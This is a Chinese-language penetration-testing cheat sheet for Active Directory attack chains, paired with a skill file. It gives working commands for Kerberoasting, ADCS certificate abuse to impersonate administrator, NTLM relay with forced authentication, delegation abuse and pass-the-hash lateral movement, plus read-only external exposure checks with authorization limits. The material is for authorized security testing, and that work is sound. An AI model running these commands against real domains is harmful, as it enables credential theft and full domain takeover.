# AD 攻击链速查（命令 + 判据）

> 配套 `SKILL.md`。所有命令仅在授权范围内使用。占位符：`<domain>`、`<DC_IP>`、`<user>`、`<pass>`、`<ntlm>`、`<target>`。

## 0. 先固定变量

```bash
export DOMAIN='corp.local'
export DC='10.0.0.10'
export USER='alice'
export PASS='P@ssw0rd'
# 时间同步（Kerberos 5 分钟容忍）
sudo chronyc makestep || sudo ntpdate -u "$DC"
```

证据目录建议：

```bash
mkdir -p work/<case>/{enum,kerb,adcs,relay,lateral}
date -Is | tee work/<case>/run.start
```

## 1. 域信息与只读枚举

```bash
# 主机/域/策略
nxc smb "$DC" -u "$USER" -p "$PASS" -d "$DOMAIN"
nxc smb "$DC" --pass-pol -u '' -p ''
nxc ldap "$DC" -u "$USER" -p "$PASS" -d "$DOMAIN" --users --groups --gmsa
# 直接查 LDAP
ldapsearch -x -H "ldap://$DC" -D "$USER@$DOMAIN" -w "$PASS" \
  -b "dc=${DOMAIN%%.*},dc=${DOMAIN#*.}" \
  '(objectClass=user)' sAMAccountName memberOf servicePrincipalName
```

关注：`userAccountControl` 含 `DONT_REQ_PREAUTH`（AS-REP 可打）、`TRUSTED_FOR_DELEGATION`；`msDS-AllowedToDelegateTo`；`adminCount=1`；`servicePrincipalName` 非空的服务账号。

判据：能列出域用户/组/SPN/委派属性，且至少一条指向高权路径（Domain Admins 成员、ACL 可写、可注册模板）。

## 2. BloodHound 采集

```bash
bloodhound-python -u "$USER" -p "$PASS" -d "$DOMAIN" -ns "$DC" -c All --zip
# Windows
SharpHound.exe -c All --zipfilename bh.zip
```

导入后优先看：

- `Shortest Paths to Domain Admins`
- `Kerberoastable Users` / `AS-REP Roastable Users`
- `Unconstrained Delegation` / `Constrained Delegation` / `RBCD`
- `WriteDACL` / `GenericAll` / `ForceChangePassword` / `AddMember`
- `ADCS` 节点（ESC 模板）
- `Sessions` 与本地管理员复用

判据：图上存在从当前主体到 Tier0 的**可执行边**，且每条边有对应验证命令（不是只有"可能"）。

## 3. Kerberoasting / AS-REP

```bash
# Kerberoast：申请 RC4 TGS，离线破解
impacket-GetUserSPNs "$DOMAIN/$USER:$PASS" -dc-ip "$DC" -request \
  -outputfile work/<case>/kerb/kerb.hash
hashcat -m 13100 work/<case>/kerb/kerb.hash /usr/share/wordlists/rockyou.txt

# AS-REP：无需预认证的账号
impacket-GetNPUsers "$DOMAIN/" -dc-ip "$DC" -usersfile users.txt \
  -format hashcat -outputfile work/<case>/kerb/asrep.hash
hashcat -m 18200 work/<case>/kerb/asrep.hash /usr/share/wordlists/rockyou.txt
```

降噪：按清单逐个请求目标 SPN；优先 AES 账号（服务端仅支持 RC4 时，按单账号低频重试）。

判据：hash 被破解出明文，或该 hash 可直接用于 PtH / 申请票据。**仅拿到 hash 未破解 = 素材，不是提权证据。**

## 4. ADCS：ESC1-8

```bash
certipy find -u "$USER@$DOMAIN" -p "$PASS" -dc-ip "$DC" -vulnerable -stdout
certipy req -u "$USER@$DOMAIN" -p "$PASS" -ca '<CA>' -template '<Tpl>' \
  -upn 'administrator@'"$DOMAIN" -dc-ip "$DC"
certipy auth -pfx administrator.pfx -dc-ip "$DC"
```

| ESC | 条件 | 利用要点 |
|---|---|---|
| ESC1 | 模板允许 SAN + 低权 Enroll | 指定 `-upn administrator` 申请证书 |
| ESC2 | 模板 Any Purpose / 无 EKU | 当通用证书用，可做客户端认证 |
| ESC3 | 注册代理模板 | 用代理证书代签任意用户 |
| ESC4 | 模板 ACL 可写 | 先改模板开 SAN/EKU，再走 ESC1 |
| ESC5 | PKI 对象 ACL 可写 | 改 CA/模板对象权限 |
| ESC6 | CA 允许 SAN（EDITF_ATTRIBUTESUBJECTALTNAME2） | 任意模板都可塞 SAN |
| ESC7 | CA 管理权限（ManageCA/ManageCertificates） | 批证书/改 CA 配置 |
| ESC8 | HTTP 注册端点 + NTLM | relay 到 `/certsrv/` 拿证书 |

判据：`certipy auth` 返回目标用户 TGT 或 `Got hash`，并能用该凭据访问目标资源。只有 `find` 报 vulnerable 不算。

## 5. NTLM relay 与强制认证

```bash
# 先确认签名状态
nxc smb <target> -u '' -p '' --gen-relay-list relay_targets.txt
# relay（SMB -> SMB / LDAP / ADCS HTTP）
impacket-ntlmrelayx -tf relay_targets.txt -smb2support -socks -of work/<case>/relay
# 强制认证（需单独授权）
petitpotam.py <listener_ip> <target_ip>
# 或 printerbug / dfscoerce
```

前提：目标未强制 SMB signing、LDAP signing/EPA 未开；relay 到 LDAP 需 `LDAP signing not required`。

判据：relay 成功建立会话（`socks` 可用）或拿到 ADCS 证书；仅有入站认证请求不算。

## 6. 委派

```bash
# Constrained：S4U2Self + S4U2Proxy
impacket-getST -spn 'cifs/<target>' -impersonate administrator \
  "$DOMAIN/$USER:$PASS" -dc-ip "$DC"
export KRB5CCNAME=administrator.ccache
impacket-wmiexec -k -no-pass "$DOMAIN/administrator@<target>"

# Unconstrained：控制被委派主机后导出 TGT
Rubeus.exe monitor /interval:5 /nowrap
# Linux：krbrelayx / impacket 侧抓取
```

RBCD：

```bash
# 需要能写目标 msDS-AllowedToActOnBehalfOfOtherIdentity
impacket-addcomputer "$DOMAIN/$USER:$PASS" -computer-name 'EVIL$' -computer-pass 'P@ss1234'
rbcd.py -action write -delegate-to '<target>$' -delegate-from 'EVIL$' "$DOMAIN/$USER:$PASS"
impacket-getST -spn 'cifs/<target>' -impersonate administrator "$DOMAIN/EVIL$:P@ss1234"
```

判据：以目标身份拿到服务票据并成功远程执行（`whoami` 返回目标身份）。

## 7. 横向：PtH / WMI / WinRM / SMB

```bash
nxc smb   <target> -u "$USER" -H "$NTLM" -d "$DOMAIN" --shares
nxc wmi   <target> -u "$USER" -H "$NTLM" -d "$DOMAIN" -x 'whoami /all'
nxc winrm <target> -u "$USER" -H "$NTLM" -d "$DOMAIN" -x 'whoami /all'
impacket-psexec  "$DOMAIN/$USER@<target>" -hashes ":$NTLM"
impacket-wmiexec "$DOMAIN/$USER@<target>" -hashes ":$NTLM"
```

顺序：WinRM（5985/5986，最安静）→ WMI → SMB → psexec（创建服务，7045 告警）。

判据：目标机返回 `whoami` 且身份为预期高权账号；同时记录主机名、IP、账号、权限、时间。

## 8. 常见失败与处理

| 现象 | 原因 | 处理 |
|---|---|---|
| `KRB_AP_ERR_SKEW` | 时钟偏移 >5min | 同步时间后重试 |
| `STATUS_LOGON_FAILURE` 连续出现 | 密码错/锁定风险 | 立即停，核对来源，勿重试 |
| `ntlmrelayx` 无会话 | signing/EPA 开启 | 换目标或改打 ADCS HTTP |
| `certipy req` 拒绝 | 无 Enroll / 需审批 | 查模板 ACL 与 `manager approval` |
| `getST` 失败 | SPN 错/委派未配 | 核对 `msDS-AllowedToDelegateTo` |
| BloodHound 空图 | 采集账号权限低 | 换账号或补 LDAP 查询 |

## 9. 取证清单

- 每条路径：源主体 → 动作 → 目标主体 → 结果
- 凭据：类型、来源、有效期、指纹（SHA256 前 8 位），不回传明文
- 提权：前后 `whoami /all`、组成员、`net group "Domain Admins" /domain`
- 时间线：命令时间、目标日志时间（4624/4625/4768/4769/7045）
- 清理：删除上传工具、计划任务、临时账号；记录清理命令

## 10. 判据复核

1. 换一台干净机器按记录重放，能得到同一凭据/同一权限？
2. 有客观输出证明权限级别变化？
3. 证据能支撑报告复现且已脱敏？

三条全满足才写"已打穿"；否则写"待验证"并给出下一步。

## 11. 公网外部视角：445 / 389 / 88 只读暴露面

> 适用：目标在公网或 DMZ，只有域名/IP 清单，没有域账号。目的不是“打进去”，而是
> **在不接触凭据、不写入、不投毒的前提下，判定暴露面与可继续验证的边界**。
> 越界红线（硬约束）：**不爆破（含口令喷洒）、不写（LDAP/SMB/AD 对象）、不投毒
> （LLMNR/NBT-NS/mDNS/WPAD/伪造 DC/票据注入）**；relay/强制认证另需单独授权单。

### 11.1 先固定只读动作清单

| 允许（只读） | 禁止（越界） |
| :-- | :-- |
| TCP 握手与端口探测（授权网段）：`nmap -Pn -p 445,389,636,88,5985 --open <cidr>` | 任何口令尝试、hash 投递、口令喷洒 |
| SMB negotiate（不认证）读 dialect/signing/域/OS 提示 | SMB 会话建立后写文件、建服务、执行命令 |
| LDAP rootDSE 匿名/空绑定读 `namingContexts` 等 | LDAP add/modify/delete、改 ACL、加 RBCD |
| 对**给定用户名清单**发 AS-REQ 观察错误码（只读枚举） | 用字典爆破用户名、猜口令、请求票据后离线破解 |
| 离线解析已抓到的 type 2 challenge | LLMNR/NBT-NS/mDNS/WPAD 投毒、伪造 DC/KDC |

频率预算：同一目标每种协议 ≤3 次/24h；Kerberos 只对给定清单跑 **1 轮**；
看到 DC 侧 4768/4771 异常升高或业务告警立即停。

### 11.2 445/SMB：NTLM type 2 challenge 解析

```bash
# 只做 negotiate，不带凭据；输出含 signing / dialect / 域名 / OS 提示
nxc smb <ip> -u '' -p ''
# 也可用 nmap 脚本读取 SMB 协商信息（只读）
nmap -Pn -p 445 --script smb2-security-mode,smb-os-discovery <ip>
```

关注字段（都只是**暴露面**，不是凭据）：

- `SMB signing: False` → relay 到 SMB 的候选面（还要看 relay 目标与受害者）。
- `SMBv1: True` / `dialect` → 老协议面，先记录，不据此写“可打”。
- `domain` / `computer name` / `OS version` → 命名与版本指纹，可能与真实补丁级不符。

抓到 type 2 challenge（base64 或 hex）后**离线**解析，不联网：

```bash
python Tool/skill/ad-cloud/scripts/ad-repro.py --kind ntlm-type2 \
  --input Tool/cases/ad-cloud01/input/ntlm-type2.json --json
```

期望输出字段（`verdict=candidate` 表示“暴露面成立”，不是登录成功）：

| 字段 | 含义 | 误判风险 |
| :-- | :-- | :-- |
| `target_name` / `nb_domain` / `dns_domain` / `dns_tree` | NetBIOS/DNS 域与树名 | 目标可被策略伪装；只作命名指纹 |
| `nb_computer` / `dns_computer` | 计算机名/FQDN | 与资产清单交叉核对，别把别名当新资产 |
| `os_version` | 版本结构体（major.minor.build） | 客户端可伪造/被策略伪装，不等于补丁级 |
| `timestamp` | AV pair 7（FILETIME→UTC） | 服务端时钟可能偏；Kerberos 容忍 ±5 分钟 |
| `flags` / `flags_hex` | 协商位（SIGN/SEAL/NTLM/TARGET_INFO/VERSION…） | 只说明协商能力，不说明配置强制 |
| `challenge_fp` | 8 字节 server challenge 的指纹 | 随机数，不可复用；不要当凭据保存 |
| `auth_attempted` | 恒为 false（本工具不发认证） | 若为 true 说明有人改了工具，停用 |

判据：`signature`+`message-type-2` 两个 check 为 true，且能取到域/OS/时间戳；
**只有 type 2 = `candidate`**。要升级到 `confirmed`，必须有 relay 成功 + 目标侧执行/会话证据
（见 `06-lateral-movement.md`），且 relay 已获授权。

### 11.3 389/636：LDAP 匿名与空绑定

```bash
# rootDSE（base scope，只读）
ldapsearch -x -H "ldap://<ip>" -s base -b "" "(objectClass=*)" \
  namingContexts defaultNamingContext rootDomainNamingContext dnsHostName \
  domainFunctionality forestFunctionality supportedLDAPVersion supportedControl
# 空绑定（部分实现允许）：-D "" -w ""
ldapsearch -x -H "ldap://<ip>" -D "" -w "" -s base -b "" "(objectClass=*)"
# LDAPS 只读探测（证书告警用 -o tls_reqcert=never，须在授权范围内）
ldapsearch -x -H "ldaps://<ip>:636" -s base -b "" "(objectClass=*)"
```

期望（匿名/空绑定被允许时）：`resultCode: 0`，返回 `defaultNamingContext: DC=corp,DC=local`、
`dnsHostName`、`domainFunctionality`、`supportedControl`（如 `1.2.840.113556.1.4.319` 分页）。

失败判据（看到即停，不要换口令重试）：

- `ldap_bind: Invalid credentials (49)`：匿名被拒；不要用猜的口令“验证”。
- `ldap_bind: Strong(er) authentication required (8)`：要求签名/TLS，属收敛项。
- `Insufficient access (50)` / `unwilling to perform (53)`：绑定成功但读 rootDSE 被限。
- 连接超时/拒绝：端口未开放或 ACL 拦截。

判据：匿名 rootDSE 可读 → `candidate`（信息面）；**不能**据此写“可匿名读目录/可改对象”。
只有实际 `search` 到授权范围内的对象且返回属性，才升级为“匿名可读”的证据；
任何写操作（add/modify/RBCD/ACL）都必须另走授权单。

### 11.4 88：Kerberos 用户名枚举（只读）

```bash
# 只对给定清单，1 轮，不猜口令
kerbrute userenum --dc <dc_ip> -d <domain> users.txt -o kerb-users.txt
# 或对单账号观察错误码（不请求可破解票据）
impacket-GetNPUsers "<domain>/" -dc-ip <dc> -usersfile users.txt -no-pass -format hashcat
```

读法：

- `KDC_ERR_C_PRINCIPAL_UNKNOWN (6)` → 用户名不存在（或域不匹配）。
- `KDC_ERR_PREAUTH_REQUIRED (25)` → 账号存在且启用预认证（正常账号）。
- 直接返回 AS-REP → 账号 `DONT_REQ_PREAUTH`（AS-REP roastable）；**未授权不要离线破解**。
- `KDC_ERR_CLIENT_REVOKED (18)` / `ACCOUNT_DISABLED` → 账号存在但禁用。
- `KRB_AP_ERR_SKEW (37)` → 本机与 KDC 时差 >5 分钟，先对时再判断。

失败判据：`KDC has no support for encryption type`、连接超时、域不存在（`KDC_ERR_WRONG_REALM`）
→ 记录为“88 暴露但枚举不可用”，不要继续换字典。

代价与边界：每次 AS-REQ 都会在 DC 留 4768；批量清单会形成明显枚举模式。
只允许对书面给定的用户名清单跑 1 轮；**不得**用常见用户名/口令字典扩充清单。

### 11.5 暴露面 ≠ 可利用（结论上限）

| 观察 | 最高结论 | 升级为 confirmed 还需要 |
| :-- | :-- | :-- |
| 445 开放 + `SMB signing: False` | `candidate`（relay 候选） | 授权 relay + 受害者认证 + 目标侧 4624/4688/7045 |
| 解析出 type 2（域/OS/时间戳） | `candidate`（暴露面） | relay 成功并拿到会话/命令输出 |
| LDAP 匿名 rootDSE 可读 | `candidate`（信息面） | 授权范围内实际读到对象属性，或匿名写（另需授权） |
| Kerberos 返回“账号存在”/AS-REP | `candidate`（枚举面） | 授权离线破解出明文，或用票据完成一次只读访问 |
| 88 开放但只回 `PREAUTH_REQUIRED` | `blocked`（无 roast 面） | 换合法凭据或转其它面 |
| 只有端口开放、无协议响应 | `blocked` | 先确认网络路径/防火墙，不要猜服务 |

### 11.6 证据包与红线

```text
目标：<ip>/<fqdn>（授权清单编号）
只读动作：<nmap / nxc negotiate / ldapsearch base / kerbrute 1 轮>（rc=0）
原始输出：<字段/错误码/时间>（账号与来源脱敏）
解析结果：<ad-repro verdict=candidate + 域/OS/时间戳指纹>
未做：未爆破、未写、未投毒、未建会话、未请求可破解票据
边界：<授权时间窗/频率/停止条件>
下一步：<需要哪张授权单才能升级验证>
```

- 不把公网暴露面写进“已攻破”；报告里分开写“暴露面 / 可利用性 / 修复建议”。
- 不保存 challenge、票据、hash 原文；只留指纹与时间。
- 不在客户未授权的第三方资产上做任何协商或枚举；扫描范围严格等于清单。
- 发现匿名可写、可 relay、可 roast 时，先停手写证据，再按授权单决定是否验证。

## 12. 外部接入面：SSL VPN / 邮件前端 / 身份云（只读）

> 适用：目标只有域名/IP 与登录页，没有凭据。**硬约束：只读、不爆破、不投毒**——
> 不提交凭据、不做口令喷洒/默认口令尝试、不写对象、不发畸形利用包；只取首页、静态资源、
> 公开 metadata、协议协商与错误码分类。pre-auth RCE PoC、强制认证、relay 另需单独授权单，
> 且先做检测型验证。频率：同目标同路径 ≤1 次/小时，不刷 CVE 路径字典。

### 12.1 五列判据（指纹 → 只读判据 → 失败判据 → 代价 → 脚本字段）

| 面 | 暴露面指纹（只看响应） | 只读验证判据（可机检） | 失败判据 | 代价 | 脚本判据字段（`--kind edge-fingerprint`） |
| :-- | :-- | :-- | :-- | :-- | :-- |
| Cisco ASA / AnyConnect | `/+CSCOE+/logon.html`、`Set-Cookie: webvpn=`、页内 `AnyConnect` | 200/302 且首页含 `CSCOE`；`/+CSCOE+/saml/sp/metadata` 返回 XML，可读出 `AuthnRequestsSigned`/`WantAssertionsSigned` | 路径 404 且首页无厂商字样；metadata 要登录 → 记 `blocked` | 低：每个请求进 WAF/SIEM | `product=cisco-asa, confidence=high, evidence=[cookie webvpn, path /+CSCOE+/logon.html]` |
| Fortinet FortiGate | `/remote/login`、`Set-Cookie: SVPNCOOKIE=`、页内 `FortiGate` | 登录页 200 且含 `FortiGate`/`SSL-VPN`；`/remote/saml/metadata` 可读 | 404/统一错误页（banner 被抹）→ 只记“疑似 VPN” | 低 | `product=fortinet-fortigate, confidence=high, evidence=[cookie SVPNCOOKIE, path /remote/login]` |
| Citrix NetScaler / ADC | `/vpn/index.html`、`Set-Cookie: NSC_AAA=`、`/menu/neo` | 首页 200 且含 `NetScaler`/`Citrix Gateway`；saml 端点可读 | 403 且无 `NSC_*` cookie → 不是网关面 | 低 | `product=citrix-netscaler, confidence=high, evidence=[cookie NSC_AAA/LastMRH_Session, path /vpn/index.html]` |
| Palo Alto GlobalProtect | `/global-protect/login.esp`、`panui-<ver>`、`PHPSESSID` | 登录页 200 且含 `GlobalProtect Portal`；`panui-` 版本串入档 | 404/仅跳转门户首页 | 低 | `product=paloalto-globalprotect, confidence=high, evidence=[body panui-, path /global-protect/login.esp]` |
| Pulse / Ivanti Connect Secure | `/dana-na/auth/url_default/welcome.cgi`、`DSAuthSession=` | 200 且页内含 `Pulse Secure`/`Ivanti`；版本串可读 | 302 到统一登录、无 `dana-na` 路径 | 低 | `product=pulse-ivanti, confidence=high, evidence=[cookie DSAuthSession, path /dana-na/auth/url_default/welcome.cgi]` |
| SonicWall / F5 | `swap=`/`swapauth=`、`/my.policy`、`BIGipServer*` | 登录页含 `SonicWall`/`NetExtender`/`BIG-IP` | 只有通用 401/403 | 低 | `product=sonicwall-f5, confidence=high, evidence=[cookie swap|LastMRH_Session|BIGipServer*, path /cgi-bin/welcome|/my.policy]` |
| Exchange / OWA | `X-OWA-Version`、`X-FEServer`、`WWW-Authenticate: Negotiate` | 一次 Type-1 negotiate（**不带凭据**）拿到 NTLM type 2，离线解析域名/OS/时间戳 → `ad-repro --kind ntlm-type2`；`/owa/healthcheck.htm` 200 | 无 `X-OWA-Version` 且 negotiate 不回 type 2；`/owa/` 401 但无挑战 | 低；只有 Type-1，无认证尝试 | `product=microsoft-owa, confidence=med（无 X-OWA-Version/X-OWA-CANARY 时最高 med）, evidence=[path /owa/, header www-authenticate]` |
| Zimbra | `/zimbra/`、页题 `Zimbra`、`/service/soap/` | 匿名 `GetVersionInfoRequest` 返回 `<VersionString>`/`<ReleaseString>`（不认证、不枚举用户） | SOAP 要求 authToken；只回登录页 → 只记版本面 | 低；用户枚举属越界（会产生登录失败日志） | `product=zimbra, confidence=high, evidence=[cookie ZM_TEST, path /zimbra/]` |
| Okta | `<tenant>.okta.com/login`、`/.well-known/okta-organization` | well-known 返回 `id`/`issuer`/endpoints；登录页重定向链里出现租户 slug | 404/统一错误；org 未公开 well-known | 低；因素枚举需已授权会话 | `product=okta, confidence=high, evidence=[cookie DT, path /.well-known/okta-organization]` |
| M365 / Entra | `*.onmicrosoft.com`、`login.microsoftonline.com` 重定向、`autodiscover.*` | `getuserrealm.srf?login=<domain>&xml=1` 得 `NameSpaceType`（Managed/Federated）与 `AuthURL`；`<domain>/.well-known/openid-configuration` 得 tenant/issuer | 域不属该租户；openid-configuration 404 → 换域 | 低；**不发 ROPC/不做 AADSTS 尝试**（那需授权单） | `product=m365-entra, confidence=high, evidence=[body NameSpaceType, path /getuserrealm.srf]` |

判据：指纹命中 + 至少一个**公开端点**返回可解析字段（XML/JSON/版本串）。
失败判据：只有端口开放或登录页 HTML，无厂商字符串、无 metadata、无版本字段 → `blocked`，
只记“暴露面未知”，不得用默认口令、CVE 路径字典或用户名枚举把它升级成验证。

### 12.2 身份云只读核查（Okta / Entra）

```bash
# 租户/联邦关系（不认证）
curl -s 'https://login.microsoftonline.com/getuserrealm.srf?login=user@<domain>&xml=1'
curl -s 'https://login.microsoftonline.com/<domain>/.well-known/openid-configuration'
curl -s 'https://<tenant>.okta.com/.well-known/okta-organization'
curl -s 'https://<tenant>.okta.com/.well-known/openid-configuration'
```

| 可读字段 | 含义 | 结论上限 |
| :-- | :-- | :-- |
| `NameSpaceType=Managed` | 云内认证，口令路径存在 | `candidate`（认证面） |
| `NameSpaceType=Federated` + `AuthURL` | 联邦到 ADFS/Okta/Ping | 转 IdP 面，仍只读 |
| `tenant_id` / `issuer` | 租户身份与多租户判定 | 资产归属证据 |
| Okta `id`/`issuer` | 组织身份；slug 是否可猜 | `candidate`（租户存在） |
| 登录页因素图标/文案 | 仅 UI 提示，不是配置真值 | 不作判据 |

失败判据：域名与租户不匹配（`AADSTS90002`/404）、`AuthURL` 指向授权清单外的第三方 IdP
→ 停，不跨租户/跨组织探测。**AADSTS 错误码分类（50034/50126/50076/53003）必须提交凭据，
属“认证尝试”，只在授权单允许时按 ≤1 次/账号执行**，见 `m365`-类材料与 `02-failure-criteria.md`。

### 12.3 结论上限与证据包

| 观察 | 最高结论 | 升级还需 |
| :-- | :-- | :-- |
| 厂商登录页 + metadata 可读 | `candidate`（暴露面） | 授权单：单版本 CVE 检测（不写、不重启） |
| OWA/VPN 管理面 NTLM type 2 可解析 | `candidate` | relay 授权 + 受害者认证 + 目标侧 4624/4688 |
| Zimbra 版本可读 | `candidate` | 授权校验补丁级；不得上传/遍历 |
| Okta/Entra 租户与联邦可读 | `candidate` | 授权后的只读目录/日志审计 |
| 只有端口/登录页 | `blocked`/`unknown` | 补资产归属与授权，不猜服务 |

证据包（四件）：授权编号与清单条目；时间与源 IP；请求方法+路径+状态码+响应头片段；`未做` 声明（未爆破/未提交凭据/未写/未投毒/未发利用包）。

### 12.4 怎么跑（离线优先，在线只读）

```bash
export PYTHONIOENCODING=utf-8
# 1) 离线复算：10 类脱敏样例，零网络，rc=0
python Tool/skill/ad-cloud/scripts/ad-repro.py --kind edge-fingerprint \
  --fixture Tool/cases/ad-cloud01/input/edge-fingerprint.json
# 2) 在线只读：HEAD 优先、GET 兜底；不提交凭据、不带 Cookie jar、不跟随登录
python Tool/skill/ad-cloud/scripts/ad-repro.py --kind edge-fingerprint --url https://<host>/
# 3) 多目标：[{"url","product_hint"}, ...]；--strict 时有 blocked 目标返回 rc=3
python Tool/skill/ad-cloud/scripts/ad-repro.py --kind edge-fingerprint --input targets.json --strict
```

输出固定 `{"ok", "kind":"edge-fingerprint", "results":[...], "blocked_at"}`；每条含
`product / confidence(low|med|high) / evidence[{header,path,value}] / judgement`，且
`auth_attempted` 恒为 `false`。判定口径：单条线索=low；两条独立线索（不同家族）=med；
产品专属 cookie/版本串 + 专属路径=high。`high` 只表示指纹吻合，结论上限仍是 `candidate`
（暴露面）；无指纹时 `product=null, verdict=blocked`，不得用默认口令或 CVE 路径字典升级。
`--self-test` 断言 10 类全对，且 OWA 缺 `X-OWA-Version` 时不得判 high。

> 投递/钓鱼面（附件宏执行链、LNK/ISO、OAuth 同意钓鱼、二维码钓鱼）只看**遥测判据**，
> 已并入 `Tool/skill/web-pentest/references/01-criteria.md` §9（本域 refs 已满额，且邮件网关/条件访问日志与 Web 侧会话证据同源）。
